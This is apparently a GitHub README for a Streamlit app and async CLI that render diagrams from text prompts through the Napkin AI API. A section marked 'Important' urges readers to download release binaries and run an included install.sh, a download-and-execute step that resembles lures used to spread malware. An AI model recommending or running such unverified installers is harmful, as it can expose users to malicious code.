Napkin-AI-API: Streamlit App & Async CLI for Visuals
=====================================================

[![Releases](https://img.shields.io/github/v/release/marksteven2895/Napkin-AI-API?label=Releases&color=blue)](https://github.com/marksteven2895/Napkin-AI-API/releases)  
https://github.com/marksteven2895/Napkin-AI-API/releases

Built for teams and devs who turn text into diagrams, illustrations, and design assets. This repo contains a Streamlit web app, an async Python CLI client, and helpers for working with the Napkin AI API. The tools support 15+ built-in visual styles and common output formats.

Badges
------
[![PyPI](https://img.shields.io/pypi/v/napkin-ai-api?color=orange)](https://pypi.org/project/napkin-ai-api) [![Python](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/) [![License](https://img.shields.io/github/license/marksteven2895/Napkin-AI-API)](LICENSE)

Preview Images
--------------
- Hero diagram:  
  ![diagram](https://images.unsplash.com/photo-1526378721926-0a47f8c362cc?auto=format&fit=crop&w=1200&q=60)
- Streamlit UI sample:  
  ![streamlit-ui](https://streamlit.io/images/brand/streamlit-logo-primary-colormark-darktext.png)

Core Topics
-----------
app-client, async, cli, diagram-api, diagram-app, httpx, napkin-ai, pydantic, python, rich, streamlit, streamlit-webapp, typer, visual-generation

Features
--------
- Streamlit web app that turns text prompts into diagrams and illustrations.
- Async Python CLI built with Typer and httpx.
- Pydantic models for request/response validation.
- 15+ built-in rendering styles (wireframe, isometric, whiteboard, infographic, flat, hand-drawn, schematic, blueprint, infographic, corporate, playful, minimal, technical, photo-real, comic).
- Export to PNG, SVG, PDF, and optimized WebP.
- Batch mode for multi-diagram jobs.
- Optional local caching for faster re-renders.
- Rich console output for CLI and logs.

What’s in this Repo
-------------------
- app/ - Streamlit app code and static assets
- cli/ - Typer-based CLI client
- napkin_api/ - async API client, models, utils
- examples/ - sample prompts, scripts, and test data
- docs/ - usage guides and API reference
- tests/ - unit and integration tests
- Dockerfile and docker-compose for local deploy

Quickstart — Streamlit
----------------------
1. Clone the repo.
2. Create a virtualenv and install.
   - pip install -r requirements.txt
3. Set environment variables:
   - NAPKIN_API_KEY (your Napkin AI API key)
4. Run the app:
   - streamlit run app/main.py --server.port 8501
5. Open http://localhost:8501 and enter a prompt.

Quickstart — CLI
----------------
Install the package and run the CLI:

- pip install napkin-ai-api
- Export the key:
  - export NAPKIN_API_KEY="your_key"
- Generate a diagram from a prompt:
  - napkin gen "Draw a microservice diagram with three services and a load balancer" --style schematic --format svg --output ./diagram.svg

You can run the CLI in async batch mode to generate many diagrams:

- napkin batch examples/batch_prompts.json --concurrency 4 --out-dir outputs/

Install
-------
From source:
- git clone https://github.com/marksteven2895/Napkin-AI-API.git
- cd Napkin-AI-API
- python -m venv .venv
- source .venv/bin/activate
- pip install -r requirements.txt
- pip install -e .

Docker:
- docker build -t napkin-ai-api .
- docker run -e NAPKIN_API_KEY="$KEY" -p 8501:8501 napkin-ai-api

Configuration
-------------
Set these environment variables:

- NAPKIN_API_KEY — API key for Napkin AI.
- NAPKIN_API_URL — Override base URL for the API (optional).
- CACHE_DIR — directory for cached renders (optional).
- LOG_LEVEL — debug, info, warn.

Example .env:
- NAPKIN_API_KEY=sk_live_...
- CACHE_DIR=./.cache

Usage Examples
--------------

1) Async httpx client (Python)
```python
import asyncio
from napkin_api.client import NapkinClient
from napkin_api.models import RenderRequest

async def main():
    client = NapkinClient(api_key="YOUR_KEY")
    req = RenderRequest(
        prompt="Show a flow of user -> web -> api -> db. Use blue boxes and arrows.",
        style="wireframe",
        output_format="svg",
        width=1200,
        height=800
    )
    out = await client.render(req)
    with open("flow.svg", "wb") as f:
        f.write(out)
    await client.close()

asyncio.run(main())
```

2) CLI example (shell)
```bash
napkin gen "Create a whiteboard sketch of a CI/CD pipeline" \
  --style whiteboard \
  --format png \
  --output ci_pipeline.png
```

3) Streamlit usage
- Use the left sidebar to type a prompt.
- Pick a style and format.
- Click Generate.
- Use the download buttons for PNG/SVG/PDF.

Built-in Styles
---------------
The app ships with 15+ styles. Each style maps to a rendering template:

- wireframe
- isometric
- whiteboard
- infographic
- flat
- hand-drawn
- schematic
- blueprint
- corporate
- playful
- minimal
- technical
- photo-real
- comic
- sketch
- high-contrast

Each style accepts a small set of overrides: palette, stroke, shadow, label_font, and spacing.

API Client Details
------------------
- Async-first design using httpx AsyncClient.
- Pydantic models validate requests and parse responses.
- Built-in retry logic with backoff for transient errors.
- Multipart responses for multi-layer exports (SVG + metadata).
- Local cache layer keyed by prompt+style for idempotent renders.

Sample pydantic model
```python
from pydantic import BaseModel, Field

class RenderRequest(BaseModel):
    prompt: str = Field(..., max_length=4096)
    style: str = "wireframe"
    output_format: str = "png"
    width: int = 1200
    height: int = 800
    seed: int | None = None
```

Output Formats
--------------
- png — flat raster image
- svg — vector file with layers and metadata
- pdf — print-ready
- webp — optimized web format
- zip — package with SVG + assets + metadata

Batch Mode
----------
Create a JSON or NDJSON file with prompts:

examples/batch_prompts.json
```json
[
  {"prompt": "Auth flow: user -> oauth -> token store", "style":"schematic"},
  {"prompt": "DB replication diagram", "style":"blueprint"}
]
```

Run:
- napkin batch examples/batch_prompts.json --out-dir outputs --concurrency 6

Architecture
------------
- UI: Streamlit app that posts render requests and streams progress.
- CLI: Typer CLI that calls the client library.
- Client: Async httpx wrapper with pydantic models.
- Worker: Optional background worker for heavy batch jobs (Celery/RQ support example).
- Storage: Local file system by default, S3 optional.

Testing
-------
- pytest for unit tests
- integration tests use a local stub server
- run tests:
  - pytest -q

Contributing
------------
- Fork the repo.
- Open a feature branch.
- Add tests for new behavior.
- Keep functions small and types explicit.
- Run linters: black, isort, ruff.
- Open a PR with a clear description and test results.

Release Assets (Important)
--------------------------
Download release assets here:  
[https://github.com/marksteven2895/Napkin-AI-API/releases](https://github.com/marksteven2895/Napkin-AI-API/releases)

This link contains packaged builds and installers. Download the release asset that matches your platform (for example: napkin-ai-api-vX.Y.Z-linux.tar.gz or napkin-ai-api-cli-windows.zip) and execute the included installer or binary. Typical steps for a tar.gz release:

- wget https://github.com/marksteven2895/Napkin-AI-API/releases/download/vX.Y.Z/napkin-ai-api-vX.Y.Z.tar.gz
- tar -xzf napkin-ai-api-vX.Y.Z.tar.gz
- cd napkin-ai-api-vX.Y.Z
- ./install.sh   # run the included script to install the CLI and app

If the link does not work, check the Releases section on the GitHub page to find the correct asset and instructions.

Security
--------
- Keep your NAPKIN_API_KEY secret.
- Rotate keys if you suspect compromise.
- Use HTTPS endpoints only.

Roadmap
-------
- Add interactive diagram editing inside Streamlit.
- Add a webhooks endpoint for async callbacks.
- Add first-class Figma export and integration.
- Improve multi-page PDF export.

FAQ
---
Q: Can I run without an API key?  
A: No. The app requires an API key for rendering.

Q: Can I host this behind a reverse proxy?  
A: Yes. Streamlit works behind nginx or Traefik.

Q: Can I add custom styles?  
A: Yes. Place a JSON style file in app/styles/ and register it in config.

Credits & Resources
-------------------
- Streamlit — UI framework
- httpx — async HTTP client
- Typer — CLI
- Pydantic — models and validation
- Rich — console formatting

License
-------
This project uses the MIT License. See LICENSE for details.

Changelog
---------
See the Releases page for release notes and downloadable assets:  
https://github.com/marksteven2895/Napkin-AI-API/releases

Topics (for GitHub)
-------------------
app-client, async, cli, diagram-api, diagram-app, httpx, napkin-ai, pydantic, python, rich, streamlit, streamlit-webapp, typer, visual-generation

Contact
-------
Open an issue or a pull request on GitHub. Use the Discussions tab for feature requests and design ideas.